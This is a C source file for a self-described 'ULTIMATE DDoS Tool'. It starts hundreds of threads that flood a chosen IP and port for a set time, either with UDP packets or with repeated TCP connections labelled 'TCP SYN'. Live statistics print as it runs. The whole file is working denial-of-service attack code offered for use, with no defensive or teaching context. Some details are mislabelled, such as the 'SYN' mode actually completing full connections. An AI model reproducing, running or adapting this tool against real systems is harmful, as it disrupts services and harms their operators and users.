#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/evp.h>
#include <openssl/crypto.h>

#define MAX_THREADS 500
#define BUFFER_SIZE 1024

typedef struct {
    char target[256];
    int port;
    int duration;
    int attack_type;
    int thread_id;
} attack_config_t;

// Thread management
pthread_mutex_t counter_lock;
int active_threads = 0;
int packets_sent = 0;

// Multiple attack methods
void *udp_flood_attack(void *arg) {
    attack_config_t *config = (attack_config_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    time_t start_time = time(NULL);
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config->port);
    inet_pton(AF_INET, config->target, &target_addr.sin_addr);
    
    memset(buffer, 'X', BUFFER_SIZE);
    
    pthread_mutex_lock(&counter_lock);
    active_threads++;
    pthread_mutex_unlock(&counter_lock);
    
    printf("[ULTIMATE] Thread %d started UDP flood on %s:%d\n", 
           config->thread_id, config->target, config->port);
    
    while (time(NULL) < start_time + config->duration) {
        sendto(sockfd, buffer, BUFFER_SIZE, 0,
               (struct sockaddr*)&target_addr, sizeof(target_addr));
        
        pthread_mutex_lock(&counter_lock);
        packets_sent++;
        pthread_mutex_unlock(&counter_lock);
        
        usleep(500);
    }
    
    close(sockfd);
    
    pthread_mutex_lock(&counter_lock);
    active_threads--;
    pthread_mutex_unlock(&counter_lock);
    
    return NULL;
}

void *tcp_syn_attack(void *arg) {
    attack_config_t *config = (attack_config_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    time_t start_time = time(NULL);
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config->port);
    inet_pton(AF_INET, config->target, &target_addr.sin_addr);
    
    pthread_mutex_lock(&counter_lock);
    active_threads++;
    pthread_mutex_unlock(&counter_lock);
    
    printf("[ULTIMATE] Thread %d started TCP SYN on %s:%d\n",
           config->thread_id, config->target, config->port);
    
    while (time(NULL) < start_time + config->duration) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd >= 0) {
            connect(sockfd, (struct sockaddr*)&target_addr, sizeof(target_addr));
            close(sockfd);
        }
        
        pthread_mutex_lock(&counter_lock);
        packets_sent++;
        pthread_mutex_unlock(&counter_lock);
        
        usleep(1000);
    }
    
    pthread_mutex_lock(&counter_lock);
    active_threads--;
    pthread_mutex_unlock(&counter_lock);
    
    return NULL;
}

void show_stats() {
    printf("\n=== ULTIMATE ATTACK STATISTICS ===\n");
    printf("Active Threads: %d\n", active_threads);
    printf("Total Packets Sent: %d\n", packets_sent);
    printf("==================================\n");
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("ULTIMATE DDoS Tool\n");
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS> [ATTACK_TYPE]\n", argv[0]);
        printf("Attack Types: 1=UDP, 2=TCP_SYN (Default: 1)\n");
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    int attack_type = (argc > 5) ? atoi(argv[5]) : 1;
    
    if (thread_count > MAX_THREADS) {
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
        thread_count = MAX_THREADS;
    }
    
    pthread_t threads[MAX_THREADS];
    attack_config_t configs[MAX_THREADS];
    
    pthread_mutex_init(&counter_lock, NULL);
    
    printf("[ULTIMATE] Starting attack on %s:%d for %d seconds with %d threads\n",
           target_ip, target_port, attack_duration, thread_count);
    
    // Initialize thread configurations
    for (int i = 0; i < thread_count; i++) {
        configs[i].port = target_port;
        configs[i].duration = attack_duration;
        configs[i].attack_type = attack_type;
        configs[i].thread_id = i;
        strncpy(configs[i].target, target_ip, sizeof(configs[i].target) - 1);
        
        void *(*attack_function)(void*) = udp_flood_attack;
        if (attack_type == 2) {
            attack_function = tcp_syn_attack;
        }
        
        if (pthread_create(&threads[i], NULL, attack_function, &configs[i]) != 0) {
            printf("Failed to create thread %d\n", i);
        }
    }
    
    // Stats display thread
    time_t start_time = time(NULL);
    while (time(NULL) < start_time + attack_duration) {
        sleep(2);
        show_stats();
    }
    
    // Wait for all threads
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_mutex_destroy(&counter_lock);
    
    printf("[ULTIMATE] Attack completed. Final stats:\n");
    show_stats();
    
    return 0;
}
